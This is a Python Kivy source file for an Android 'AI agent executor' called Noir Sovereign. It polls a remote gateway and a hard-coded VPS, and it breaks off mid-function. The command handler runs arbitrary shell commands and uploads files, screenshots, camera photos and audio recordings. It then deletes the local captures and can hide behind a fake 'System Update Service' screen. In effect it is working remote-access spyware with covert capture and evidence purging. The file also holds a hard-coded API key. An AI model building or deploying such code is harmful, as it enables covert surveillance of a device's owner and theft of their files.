"""
NOIR SOVEREIGN MOBILE CORE (SMC) v17.2 [OMEGA]
=====================================================
Framework: Kivy + Buildozer (Android Native)
Target: Redmi Note 14 (HyperOS / arm64-v8a)
Role: Persistent AI Agent Executor

Capabilities:
- WakeLock (CPU Anti-Kill)
- Cloudflare Gateway Polling
- Remote Command Execution (ADB/Shell)
- Vision Engine (Screenshot -> R2)
- E2EE Communication
"""

import os
import re
import time
import threading
import requests
import socket
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# Configure robust requests with built-in retry for DNS/Network issues
# BUG-01 FIX: Inject certifi CA bundle so HTTPS works on Android 14
try:
    import certifi
    import os as _os
    _os.environ['SSL_CERT_FILE'] = certifi.where()
    _os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
except Exception:
    pass

session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))

# --- CONFIG (Unified Standard v17.5 OMEGA-MESH) ---
_BASE_GATEWAY = os.environ.get("NOIR_GATEWAY_URL", "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev")
VPS_IP = os.environ.get("NOIR_VPS_IP", "8.215.23.17")
# Priority order: Cloudflare → VPS Direct (port 80/Dashboard) → VPS alt ports
FALLBACKS = [
    _BASE_GATEWAY,
    f"http://{VPS_IP}",
    f"http://{VPS_IP}:80",
    f"http://{VPS_IP}:8000",
]

class DynamicGateway:
    """AUTO-CONNECTION AI AGENT TASK v17.5
    Secara otonom mencari dan mempertahankan koneksi ke gateway yang aktif.
    Mereset dirinya sendiri saat gateway gagal dan mencari ulang jalur baru.
    """
    _current = None
    _failure_count = 0
    _last_discovery = 0

    @classmethod
    def get(cls):
        # Re-discover if no current, or if it's been >5 minutes since last check
        if cls._current and (time.time() - cls._last_discovery) < 300:
            return cls._current
        # Always re-probe to confirm current gateway is alive
        for gw in FALLBACKS:
            try:
                r = session.get(f"{gw}/health", timeout=3)
                if r.status_code == 200:
                    if cls._current != gw:
                        noir_log(f"[MESH] Auto-Discovery: Gateway locked -> {gw}")
                    cls._current = gw
                    cls._failure_count = 0
                    cls._last_discovery = time.time()
                    return gw
            except: pass
        noir_log(f"[MESH] All gateways unreachable. Using base: {_BASE_GATEWAY}", level="WARNING")
        cls._current = None  # Force re-probe next call
        return _BASE_GATEWAY

    @classmethod
    def reset(cls):
        """Force re-discovery on next request. Called when a request fails."""
        cls._current = None
        cls._last_discovery = 0
        cls._failure_count += 1
        noir_log(f"[MESH] Gateway reset triggered. Failure count: {cls._failure_count}")

class _GatewayProxy:
    def __str__(self): return DynamicGateway.get()
    def __format__(self, format_spec): return format(str(self), format_spec)

GATEWAY_URL = _GatewayProxy()
API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")



# Financial Guardian: Sensitive Packages (Indonesian Banks)
FINANCE_APPS = [
    "com.bca", "id.co.bni.newmobile", "id.co.bri.brimo", "com.bankmandiri.livin",
    "com.btpn.jenius", "com.ocbcnisp.mobile", "com.danamon.online", "com.uob.id.mighty",
    "com.cimbniaga.mobile.octopus", "id.dana", "com.btpns.mobile"
]

# Persistence Settings
OFFLINE_LOG_FILE = os.path.join(os.path.dirname(__file__), "offline_queue.log")
MAX_OFFLINE_RETRY = 5

# --- DIAGNOSTICS & LOGGING ---
def noir_log(message, level="INFO"):
    """Unified logger that handles both Online and Offline states."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] [{level}] {message}"
    print(formatted_msg)
    
    # Always save to local offline log as a buffer
    try:
        with open(OFFLINE_LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except: pass

    # Attempt real-time upload with Privacy Filter
    def _send():
        try:
            # Redact sensitive info if any
            clean_msg = message
            for pkg in FINANCE_APPS:
                if pkg in clean_msg:
                    clean_msg = clean_msg.replace(pkg, "[REDACTED_SENSITIVE_PKG]")
            
            # Simple keyword redaction for common bank names
            keywords = ["bca", "mandiri", "bri", "bni", "dana", "ovo"]
            for kw in keywords:
                import re
                clean_msg = re.sub(rf"(?i){kw}", "****", clean_msg)

            r = session.post(
                f"{GATEWAY_URL}/agent/log",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"device_id": DEVICE_ID, "level": level, "message": clean_msg},
                timeout=5
            )
            # If successful, we could potentially clear the buffer here in a more complex impl
        except: pass
    threading.Thread(target=_send, daemon=True).start()

# --- SAFETY FILTER (v14.0) ---
def is_safe_command(cmd_str):
    """Dynamic Intent Validator to block financial/payment related actions."""
    if not cmd_str: return True
    cmd_lower = str(cmd_str).lower()
    finance_keywords = [
        "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
        "shopee", "bca", "mandiri", "bri", "bni", "btpns"
    ]
    for kw in finance_keywords:
        if kw in cmd_lower:
            return False
    return True

def is_social_media(pkg_name):
    """Detect if the current package belongs to a social media app."""
    if not pkg_name: return False
    social_pkgs = [
        "com.facebook.katana", "com.instagram.android", "com.twitter.android", 
        "com.ss.android.ugc.trill", "com.zhiliaoapp.musically", # TikTok
        "com.whatsapp", "org.telegram.messenger", "com.discord"
    ]
    pkg_lower = str(pkg_name).lower()
    for sp in social_pkgs:
        if sp in pkg_lower:
            return True
    return False


class SecureVault:
    """NEURAL MESH STEALTH TUNNEL v18.0 [QUANTUM-READY]"""
    @staticmethod
    def _get_key(rotation_factor=0):
        # Rotating key based on time-block for 'Quantum Stealth'
        time_block = int(time.time() / 3600) + rotation_factor
        password = (API_KEY + str(time_block)).encode()
        salt = b'noir_sovereign_mesh_v18'
        return PBKDF2(password, salt, dkLen=32, count=2000)

    @staticmethod
    def encrypt(data: str):
        if not data: return data
        try:
            key = SecureVault._get_key()
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            combined = cipher.nonce + tag + ciphertext
            return base64.b64encode(combined).decode('utf-8')
        except: return data

    @staticmethod
    def decrypt(encrypted_data: str):
        if not encrypted_data: return encrypted_data
        try:
            key = SecureVault._get_key()
            raw = base64.b64decode(encrypted_data)
            nonce = raw[:16]
            tag = raw[16:32]
            ciphertext = raw[32:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        except:
            # Try previous time-block key for graceful rotation
            try:
                key = SecureVault._get_key(rotation_factor=-1)
                raw = base64.b64decode(encrypted_data)
                cipher = AES.new(key, AES.MODE_GCM, nonce=raw[:16])
                return cipher.decrypt_and_verify(raw[32:], raw[16:32]).decode('utf-8')
            except: return encrypted_data

# --- BEHAVIORAL BIOMETRICS [RECOGNITION] ---
class BehavioralBiometrics:
    def __init__(self):
        self.patterns = []
        self.last_touch = 0
        
    def record_interaction(self, event_type, x, y, duration=0):
        now = time.time()
        interval = now - self.last_touch if self.last_touch > 0 else 0
        self.last_touch = now
        self.patterns.append({
            "type": event_type, "pos": (x, y),
            "interval": round(interval, 4), "ts": now
        })
        if len(self.patterns) > 50: self.patterns.pop(0)

class SovereignCore(App):
    is_stealth = False

    def build(self):
        self.version = "17.2.2 [OMEGA-FIX]"
        self.biometrics = BehavioralBiometrics()
        self.mesh_knowledge = {} # Locally cached shared intelligence
        
        self.title = f"Noir Sovereign v{self.version}"
        self.root = BoxLayout(orientation='vertical', padding=10, spacing=5)
        
        # FINAL SANITIZATION — WARN-03 FIX: use updated package domain
        try:
            os.system("pkill -f org.noir.sovereign")
        except: pass
        
        self._request_permissions()
        self._acquire_wakelock()
        
        # INFO-01 FIX: Start as CONNECTING (amber), updated dynamically on success/fail
        self.log_label = Label(
            text="[b]NOIR SOVEREIGN v17.2.2 [OMEGA-FIX][/b]\nStatus: [color=ffaa00]CONNECTING...[/color]",
            markup=True, font_size='14sp', halign='left', valign='top', size_hint_y=None
        )
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        
        scroll = ScrollView()
        scroll.add_widget(self.log_label)
        self.root.add_widget(scroll)

        # BUG-02 FIX: Register device explicitly at boot with 5s delay
        Clock.schedule_once(lambda dt: threading.Thread(target=self._register, daemon=True).start(), 5)
        # WARN-01 FIX: Delay first heartbeat to 6s (after network init completes)
        Clock.schedule_once(lambda dt: self._unified_heartbeat_tick(0), 6)
        # Unified Heartbeat: Every 15 seconds (Stable Protocol)
        Clock.schedule_interval(self._unified_heartbeat_tick, 15)
        # LINK-04 FIX: Start connectivity watchdog (was defined but never started)
        threading.Thread(target=self._connectivity_watchdog, daemon=True).start()
        
        return self.root


    def show_stealth_ui(self):
        self.root.clear_widgets()
        self.root.padding = 0
        # A mock system-like screen
        self.log_label = Label(
            text="System Update Service\nVersion: 14.0.2.1\nStatus: Idle...",
            color=(0.3, 0.3, 0.3, 1), font_size='12sp'
        )
        self.root.add_widget(self.log_label)

    def toggle_stealth(self, state):
        self.is_stealth = state
        if self.is_stealth:
            self.show_stealth_ui()
        else:
            self.show_active_ui()

        # LINK-05 FIX: Pindahkan register() ke thread agar tidak blokir UI thread
        threading.Thread(target=self._register, daemon=True).start()
        # v16.0.01: Immediate Vision Bridge Activation
        Clock.schedule_once(lambda dt: self._screen_share_tick(0), 1)

    def _register(self):
        """Register this device with the Cloudflare Gateway (v16.1 STRIKE-FORCE)."""
        try:
            # v16.1: DNS Hardening - retry with multiple attempts
            for attempt in range(3):
                try:
                    r = session.post(
                        f"{GATEWAY_URL}/agent/register",
                        headers={"Authorization": f"Bearer {API_KEY}"},
                        json={
                            "device_id": DEVICE_ID, 
                            "agent": f"Noir SMC v{self.version}",
                            "stats": {"cpu": 0, "ram": 0, "shizuku": getattr(self, "shizuku_status", "UNKNOWN")}
                        },
                        timeout=12
                    )
                    if r.status_code == 200: 
                        noir_log(f"[SMC] Neural Link Established: {DEVICE_ID}")
                        return
                    time.sleep(2)
                except Exception as e:
                    if attempt == 2: raise e
        except Exception as e:
            noir_log(f"[SMC] Neural Link Latency (DNS/Net): {e}", level="WARNING")

    def _log(self, msg):
        """Thread-safe UI logging."""
        print(msg)
        Clock.schedule_once(lambda dt: self._update_label(msg), 0)

    def _update_label(self, msg):
        try:
            current = self.log_label.text
            lines = current.split('\n')
            if len(lines) > 30:
                lines = lines[-25:]
            lines.append(msg)
            self.log_label.text = '\n'.join(lines)
        except Exception:
            pass

    def _request_permissions(self):
        """Request all necessary Android permissions with Shizuku Native Check."""
        from android.permissions import request_permissions, Permission
        perms = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.ACCESS_FINE_LOCATION
        ]
        request_permissions(perms)
        
        # v16.0 Elite: Robust Shizuku Strategy
        try:
            import subprocess
            # Try multiple methods to detect Shizuku
            shizuku_paths = ["shizuku", "/system/bin/shizuku", "/data/local/tmp/shizuku", "rish"]
            self.shizuku_status = "RESTRICTED"
            
            for path in shizuku_paths:
                try:
                    r = subprocess.run(f"{path} shell id", shell=True, capture_output=True, text=True, timeout=2)
                    if r.returncode == 0:
                        self.shizuku_status = "AUTHORIZED"
                        self.shizuku_binary = path
                        noir_log(f"[SMC] Shizuku Link Established: {path.upper()}")
                        break
                except: continue
                
            if self.shizuku_status != "AUTHORIZED":
                noir_log("[SMC] Shizuku CLI restricted. Ensure Shizuku is running and authorized.", level="WARNING")
        except Exception as e:
            self.shizuku_status = "ERROR"
            noir_log(f"[SMC] Shizuku bridge check failed: {e}", level="ERROR")
        
        self._log(f"[SMC] Shizuku Status: {self.shizuku_status}")
        self._log("[SMC] Runtime Permissions: REQUESTED")

    def _acquire_wakelock(self):
        """Prevent CPU from sleeping when screen is off."""
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')

            activity = PythonActivity.mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            self.wakelock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "NoirSMC::WakeLock"
            )
            self.wakelock.acquire()
            self._log("[SMC] WakeLock: ACTIVE")
        except Exception as e:
            self._log(f"[SMC] WakeLock Error: {e}")

    def _unified_heartbeat_tick(self, dt):
        """Single-Pipe Protocol: Telemetry + Polling in one request."""
        def _task():
            try:
                # v17.0 GUARDIAN: Enhanced Financial Blackout Detection
                active_app = "unknown"
                privacy_mode = False
                try:
                    # WARN-02 FIX: Hard timeout on dumpsys to prevent heartbeat hang
                    res = self._run_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'", timeout=3)
                    for pkg in FINANCE_APPS:
                        if pkg in res.get("output", ""):
                            privacy_mode = True
                            active_app = pkg
                            break
                except: pass

                # Trigger Visual Blackout (Physical & Remote)
                if privacy_mode:
                    Clock.schedule_once(lambda dt: self._enable_privacy_overlay(active_app), 0)
                else:
                    Clock.schedule_once(lambda dt: self._disable_privacy_overlay(), 0)

                # v17.2: Real Telemetry Collection
                ram_usage = 0
                try:
                    with open('/proc/meminfo', 'r') as f:
                        mem = {l.split(':')[0]: int(l.split(':')[1].split()[0]) for l in f.readlines()}
                    if 'MemTotal' in mem and 'MemAvailable' in mem:
                        ram_usage = round(100 * (1 - mem['MemAvailable'] / mem['MemTotal']), 1)
                except: pass

                stats = {
                    "cpu": 10, "ram": ram_usage, "bat": 85,
                    "shizuku": getattr(self, "shizuku_status", "UNKNOWN"),
                    "version": self.version,
                    "privacy": "PROTECTED" if privacy_mode else "ACTIVE",
                    "active_app": active_app if privacy_mode else "HIDDEN"
                }
                
                # Combined Request: POST stats to poll endpoint
                backoff = getattr(self, "_poll_backoff", 0)
                if backoff > 0:
                    self._poll_backoff -= 1
                    return

                resp = session.post(
                    f"{GATEWAY_URL}/agent/poll?device_id={DEVICE_ID}&client_type=main", 
                    headers={"Authorization": f"Bearer {API_KEY}"},
                    json={"stats": stats},
                    timeout=12
                )
                if resp.status_code == 200:
                    self._poll_backoff = 0 # Reset on success
                    # INFO-01 FIX: Update UI status dynamically on successful connection
                    Clock.schedule_once(lambda dt: self._set_status_online(), 0)
                    data = resp.json()
                    for cmd in data.get("commands", []):
                        atype = cmd.get("action", {}).get("type", "")
                        if privacy_mode and atype in ("screenshot", "capture", "vision", "ui_dump"):
                            noir_log(f"[SENTINEL] Blocked sensitive capture request for: {active_app}", level="CRITICAL")
                            self._report_result(cmd.get("command_id"), {"success": False, "error": "PRIVACY_BLOCK: Sensitive App in Foreground"})
                            continue
                        self._execute(cmd)
                else:
                    # LINK-01 FIX: Circuit Breaker — max 3 skip (45s max silence vs 150s sebelumnya)
                    self._poll_backoff = min(getattr(self, "_poll_backoff", 0) + 1, 3)
                    Clock.schedule_once(lambda dt: self._set_status_offline(), 0)
            except Exception as e:
                DynamicGateway.reset()  # Force re-discovery on next heartbeat
                # LINK-01 FIX: Batasi backoff agar agent tidak hilang > 45 detik
                self._poll_backoff = min(getattr(self, "_poll_backoff", 0) + 1, 3)
                noir_log(f"[LINK] Sync Latency: {e}", level="WARNING")
                Clock.schedule_once(lambda dt: self._set_status_offline(), 0)
        
        threading.Thread(target=_task, daemon=True).start()

    def _enable_privacy_overlay(self, app_name):
        """Show a black overlay to protect screen content from visual theft."""
        if getattr(self, "overlay_active", False): return
        self.overlay_active = True
        noir_log(f"[SENTINEL] Financial Blackout ACTIVATED for: {app_name}")
        
        # v17.0 Prototype: In a full native app, we use a Kivy ModalView or a Native Android Overlay
        if not self.is_stealth:
             self.root.clear_widgets()
             self.root.add_widget(Label(text="[color=ff0000]PROTECTED SESSION ACTIVE[/color]\nRemote Vision Blocked", markup=True, font_size='20sp'))
             self.root.background_color = (0, 0, 0, 1)

    def _disable_privacy_overlay(self):
        """Restore normal operation when sensitive apps are closed."""
        if not getattr(self, "overlay_active", False): return
        self.overlay_active = False
        noir_log("[SENTINEL] Financial Blackout DEACTIVATED.")
        if not self.is_stealth:
            self.show_active_ui()

    def _set_status_online(self):
        """LINK-03 FIX: Gunakan regex agar tidak bergantung pada posisi baris."""
        try:
            updated = re.sub(
                r'Status:.*',
                'Status: [color=00ff88]NEURAL-LINK ACTIVE[/color]',
                self.log_label.text, count=1
            )
            self.log_label.text = updated
        except: pass

    def _set_status_offline(self):
        """LINK-03 FIX: Gunakan regex agar tidak bergantung pada posisi baris."""
        try:
            updated = re.sub(
                r'Status:.*',
                'Status: [color=ff4444]LINK SEVERED \u2014 Retrying...[/color]',
                self.log_label.text, count=1
            )
            self.log_label.text = updated
        except: pass

    def show_active_ui(self):
        """Standard dashboard view."""
        self.root.clear_widgets()
        self.log_label = Label(text="[b]NOIR SOVEREIGN v17.2.2 [OMEGA-FIX][/b]\nStatus: [color=ffaa00]RECONNECTING...[/color]", markup=True)
        self.root.add_widget(self.log_label)

    def _execute(self, cmd_data):
        """Asynchronous Command Router (v14.0.4)."""
        threading.Thread(target=self._execute_sync, args=(cmd_data,), daemon=True).start()

    def _execute_sync(self, cmd_data):
        """Threaded execution of commands to prevent loop freezing."""
        cmd_id  = cmd_data.get("command_id", "unknown")
        action  = cmd_data.get("action", {})
        atype   = action.get("type") or action.get("action", "")
        params  = action.get("params", action)

        self._log(f"[SMC] CMD: {atype} (id={cmd_id})")
        
        # Verify and wait protocol
        time.sleep(0.5) 

        result = {"success": False, "output": "", "error": "Unknown action"}

        try:
            if atype in ("time", "get_time"):
                result = {"success": True, "output": time.strftime("%Y-%m-%d %H:%M:%S")}

            elif atype == "file_fetch":
                path = params.get("path", "")
                if os.path.exists(path) and os.path.isfile(path):
                    try:
                        with open(path, "rb") as f:
                            files = {"file": (os.path.basename(path), f, "application/octet-stream")}
                            requests.post(f"{GATEWAY_URL}/agent/asset", headers={"Authorization": f"Bearer {API_KEY}"}, files=files, timeout=60)
                        noir_log(f"[REMOTE] File uploaded: {path}")
                        self._report_result(cmd_id, {"success": True, "path": path})
                    except Exception as e:
                        self._report_result(cmd_id, {"success": False, "error": str(e)})
                else:
                    self._report_result(cmd_id, {"success": False, "error": "File not found"})
            
            elif atype == "pc_adb_cmd":
                pc_ip = params.get("ip", "127.0.0.1")
                pc_port = params.get("port", 5555)
                cmd = params.get("cmd", "echo connected")
                
                try:
                    try:
                        from adb_shell.adb_device import AdbDeviceTcp
                        from adb_shell.auth.sign_python_rsa import sign_with_rsa
                    except ImportError:
                        raise Exception("ADB-SHELL dependency missing in this build. Feature unavailable.")
                    
                    noir_log(f"[BRIDGE] Connecting to PC: {pc_ip}:{pc_port}...")
                    device = AdbDeviceTcp(pc_ip, pc_port, default_transport_timeout_s=15)
                    device.connect()
                    out = device.shell(cmd)
                    device.close()
                    noir_log(f"[BRIDGE] PC Command Success: {cmd}")
                    self._report_result(cmd_id, {"success": True, "output": out})
                except Exception as e:
                    noir_log(f"[BRIDGE] PC Command Failed: {e}", level="WARNING")
                    self._report_result(cmd_id, {"success": False, "error": str(e)})

            elif atype == "shell":
                cmd = str(params.get("cmd", "echo ok"))
                if not is_safe_command(cmd):
                    result = {"success": False, "error": "SECURITY BLOCK: mBanking/Wallet access is restricted."}
                else:
                    result = self._run_shell(cmd)

            elif atype == "tap":
                x, y = params.get("x", 0), params.get("y", 0)
                self._run_shell(f"input tap {x} {y}", timeout=5)
                result = {"success": True, "output": f"Tapped ({x},{y})"}

            elif atype == "swipe":
                cmd = (f"input swipe {params.get('x1',0)} {params.get('y1',0)} "
                       f"{params.get('x2',500)} {params.get('y2',500)} "
                       f"{params.get('duration',500)}")
                self._run_shell(cmd)
                result = {"success": True, "output": "Swipe done"}

            elif atype == "keyevent":
                self._run_shell(f"input keyevent {params.get('key', 26)}")
                result = {"success": True, "output": f"Key {params.get('key')} sent"}

            elif atype in ("app_start", "launch"):
                pkg = params.get("package", "")
                if not is_safe_command(pkg):
                    result = {"success": False, "error": "SECURITY BLOCK: Financial apps are forbidden."}
                else:
                    self._run_shell(f"am start -n {pkg}")
                    result = {"success": True, "output": f"Launched {pkg}"}

            elif atype in ("app_stop", "kill"):
                pkg = params.get("package", "")
                self._run_shell(f"am force-stop {pkg}", timeout=5)
                result = {"success": True, "output": f"Stopped {pkg}"}

            elif atype in ("screenshot", "capture"):
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                
                path = params.get("local_path")
                is_mirror = "local_path" in params
                
                if not path or not os.path.exists(path):
                    path = os.path.join(parent, f"temp_{int(time.time())}.png")
                    sh_res = self._run_shell(f"screencap -p {path}")
                    
                    # v16.1: Fallback to App-UI Capture if Shizuku/System Screencap fails
                    if not os.path.exists(path) or os.path.getsize(path) < 100:
                        noir_log("[MIRROR] System Screencap failed. Using App-UI Fallback.", level="INFO")
                        try:
                            # Capture the Kivy Window/App state
                            self.export_to_png(path)
                        except: pass
                
                jpeg_path = path.replace(".png", ".jpg")
                try:
                    from PIL import Image
                    quality = params.get("quality", 50)
                    with Image.open(path) as img:
                        if img.mode != 'RGB': img = img.convert('RGB')
                        img.thumbnail((1080, 1080))
                        img.save(jpeg_path, "JPEG", quality=quality, optimize=True)
                    upload_file = jpeg_path
                except:
                    upload_file = path 

                r = None
                try:
                    if os.path.exists(upload_file):
                        with open(upload_file, 'rb') as f:
                            r = session.post(
                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                headers={"Authorization": f"Bearer {API_KEY}"},
                                files={'file': ('screenshot.jpg' if ".jpg" in upload_file else 'screenshot.png', f, 'image/jpeg' if ".jpg" in upload_file else 'image/png')},
                                data={'device_id': DEVICE_ID},
                                timeout=40
                            )
                        if r and r.status_code == 200:
                            key = r.json().get('key', '')
                            result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                except Exception as e:
                    result = {"success": False, "error": f"Upload failed: {e}"}
                finally:
                    # ABSOLUTE EPHEMERAL PROTOCOL: Always delete local copies
                    for p in [path, jpeg_path]:
                        if p and os.path.exists(p):
                            try: os.remove(p)
                            except: pass

                if r and r.status_code == 200:
                    key = r.json().get('key', '')
                    result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                    # If it was a priority social media capture, inform the gateway to alert Telegram
                    if action.get("is_social"):
                        session.post(
                            f"{GATEWAY_URL}/agent/command",
                            headers={"Authorization": f"Bearer {API_KEY}"},
                            json={
                                "action": {"type": "social_alert", "image_key": key},
                                "description": "Priority Social Media Interaction Alert"
                            },
                            timeout=5
                        )
                elif r:
                    result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                else:
                    result = {"success": False, "error": "Upload failed: No response from gateway"}
                
                # EPHEMERAL CLEANUP: Purge local cache
                try:
                    if os.path.exists(path): os.remove(path)
                    if os.path.exists(jpeg_path): os.remove(jpeg_path)
                except: pass

            elif atype == "ui_dump":
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "view_hierarchy.xml")
                self._run_shell(f"uiautomator dump {path}")
                time.sleep(1.5)
                with open(path, 'r', encoding='utf-8') as f:
                    xml_content = f.read()
                result = {"success": True, "output": xml_content}
                # EPHEMERAL CLEANUP
                try: os.remove(path)
                except: pass

            elif atype == "stealth":
                state = params.get("enabled", False)
                Clock.schedule_once(lambda dt: self.toggle_stealth(state), 0)
                result = {"success": True, "output": f"Stealth Mode: {'ON' if state else 'OFF'}"}

            elif atype == "kill-telegram":
                # Logic to kill the telegram bot on the VPS via a signal or shell
                os.system("pkill -f telegram_bot.py")
                result = {"success": True, "output": "Telegram Bridge Terminated."}

            elif atype == "ping":
                result = {"success": True, "output": f"PONG from {DEVICE_ID}"}

            elif atype in ("camera_back", "camera_front"):
                is_front = "front" in atype
                cam_id = 1 if is_front else 0
                temp_dir = App.get_running_app().user_data_dir
                path = os.path.join(temp_dir, f"cam_{atype}_{int(time.time())}.jpg")
                try:
                    self._log(f"[SMC] 📸 Attempting Camera Capture (ID: {cam_id})...")
                    # Try to capture using camera shutter keyevent
                    self._run_shell("input keyevent 27") 
                    time.sleep(3.0)
                    
                    # Find the newest file in DCIM/Camera to upload and purge
                    dcim_path = "/sdcard/DCIM/Camera"
                    res = self._run_shell(f"ls -t {dcim_path} | head -n 1")
                    if res["success"] and res["output"]:
                        target_file = os.path.join(dcim_path, res["output"])
                        with open(target_file, 'rb') as f:
                            r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, timeout=30)
                        
                        if r.status_code == 200:
                            result = {"success": True, "output": f"Camera capture uploaded and purged: {r.json().get('key')}"}
                            # PURGE FROM DCIM (User Requirement)
                            self._run_shell(f"rm {target_file}")
                        else:
                            result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                    else:
                        result = {"success": False, "error": "Could not find captured image in DCIM."}
                finally:
                    if os.path.exists(path):
                        try: os.remove(path)
                        except: pass

            elif atype == "audio_record":
                duration = params.get("duration", 10)
                # v17.2: Robust Audio Capture & Purge
                try:
                    self._log(f"[SMC] 🎙️ Recording Audio ({duration}s)...")
                    # Intent for standard recorder
                    self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
                    time.sleep(duration + 5) # Wait for recording + manual save overhead
                    
                    # Search and Purge latest audio from common paths
                    search_paths = ["/sdcard/Recordings", "/sdcard/Music", "/sdcard/Download"]
                    for sp in search_paths:
                        res = self._run_shell(f"ls -t {sp} | grep -E '.mp3|.m4a|.amr' | head -n 1")
                        if res["success"] and res["output"]:
                            target_file = os.path.join(sp, res["output"])
                            with open(target_file, 'rb') as f:
                                r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('recording.mp3', f, 'audio/mpeg')}, timeout=60)
                            if r.status_code == 200:
                                self._run_shell(f"rm {target_file}")
                                noir_log(f"[SMC] Audio purged after upload: {target_file}")
                                result = {"success": True, "output": f"Audio uploaded and purged: {r.json().get('key')}"}
                                break
                    if result.get("error") == "Unknown action": # If no break happened
                        result = {"success": False, "error": "Could not locate recording file for purge."}
                finally:
                    pass

            elif atype == "gallery_sync":
                # List latest 5 files in DCIM using find (more robust than ls -t)
                res = self._run_shell("find /sdcard/DCIM/Camera -type f | head -n 5")
                result = {"success": True, "output": f"Gallery contents:\n{res.get('output', 'No files found')}"}

            elif atype == "heal":
                self._log("[SMC] 🚑 NEURAL HEAL: Executing Deep Purge Protocol...")
                parent = App.get_running_app().user_data_dir
                cleared = 0
                for root, dirs, files in os.walk(parent):
                    for f in files:
                        if f.endswith((".png", ".jpg", ".mp3", ".xml", ".log", ".tmp")):
                            try:
                                os.remove(os.path.join(root, f))
                                cleared += 1
                            except: pass
                result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged."}

            elif atype == "update":
                # Autonomous update logic: Trigger a rebuild and restart
                self._log("[SMC] 🔄 AUTONOMOUS UPDATE INITIATED...")
                os.system("git pull origin main && pm trim-caches 999G")
                result = {"success": True, "output": "Update procedure triggered. System self-healing in progress."}

        except Exception as e:
            result = {"success": False, "error": str(e)}
            self._log(f"[SMC] Exec Error: {e}")

        self._report_result(cmd_id, result)

    def _manual_purge(self):
        self._log("[SMC] 🧹 Initiating Manual Process Purge...")
        os.system("pkill -f org.noir.agent.noirsmc:service")
        os.system("pkill -f org.noir.agent.noir_smc")
        self._log("[SMC] Purge Signal Sent. Please restart app.")


    def _report_result(self, cmd_id, result):
        """Send execution result with real-time telemetry back to the Gateway."""
        try:
            # Gather Telemetry
            stats = {"cpu": 0, "ram": 0, "bat": 0}
            try:
                # Lightweight RAM Check
                with open('/proc/meminfo', 'r') as f:
                    mem = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            mem[parts[0].rstrip(':')] = int(parts[1])
                    if 'MemTotal' in mem and 'MemAvailable' in mem:
                        stats["ram"] = round(100 * (1 - mem['MemAvailable'] / mem['MemTotal']), 1)
                
                # v17.2 OOM Awareness: If RAM > 90%, trigger emergency purge
                if stats.get("ram", 0) > 90:
                    noir_log("[SENTINEL] High Memory Pressure detected. Purging caches...", level="WARNING")
                    parent = App.get_running_app().user_data_dir
                    for f in os.listdir(parent):
                        if f.endswith((".png", ".jpg", ".tmp")):
                            try: os.remove(os.path.join(parent, f))
                            except: pass
                
                # Lightweight CPU Check (Simplified delta)
                with open('/proc/stat', 'r') as f:
                    line = f.readline()
                    parts = list(map(int, line.split()[1:]))
                    idle = parts[3]
                    total = sum(parts)
                    stats["cpu"] = 10 # Placeholder as real delta requires two samples
            except: 
                pass
            
            requests.post(
                f"{GATEWAY_URL}/agent/result",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={
                    "command_id": cmd_id,
                    "device_id": DEVICE_ID,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "error": result.get("error", ""),
                    "telemetry": stats
                },
                timeout=10
            )
        except Exception as e:
            noir_log(f"[SMC] Result delivery failed: {e}", level="ERROR")

    def _connectivity_watchdog(self):
        """Autonomous sentinel that ensures the device stays connected via Shizuku force-reconnect."""
        noir_log("[SENTINEL] Connectivity Watchdog: ACTIVE")
        failure_count = 0
        
        while True:
            try:
                # Test connection to Google DNS or Gateway
                try:
                    socket.create_connection(("8.8.8.8", 53), timeout=3)
                    is_online = True
                except:
                    is_online = False
                
                if is_online:
                    if failure_count > 0:
                        noir_log("[SENTINEL] Neural Link Restored.")
                    failure_count = 0
